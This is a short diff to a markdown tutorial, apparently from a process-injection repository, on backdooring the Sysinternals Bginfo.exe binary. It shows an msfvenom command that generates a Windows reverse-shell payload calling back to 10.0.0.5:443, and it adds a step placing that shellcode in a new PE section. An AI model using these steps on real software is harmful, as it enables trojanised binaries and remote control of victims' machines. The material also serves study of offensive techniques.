@@ -15,3 +15,6 @@
 ```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 | hexdump -C```  
 ![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/fb73271e-7bcc-4e0f-bf7b-a0dab96a4d04)  
 *Note that the shellcode size is 324 bytes - the new PE section will have to be at least that big.*
+
+# New PE Code Section
+*I randomly chose Bginfo.exe from sysinternals as a binary to be backdoored. Let's add a new PE section called  that will contain our shellcode - note the size is 200h bytes, so plenty for our shellcode which was only 324 bytes:*```.code1```
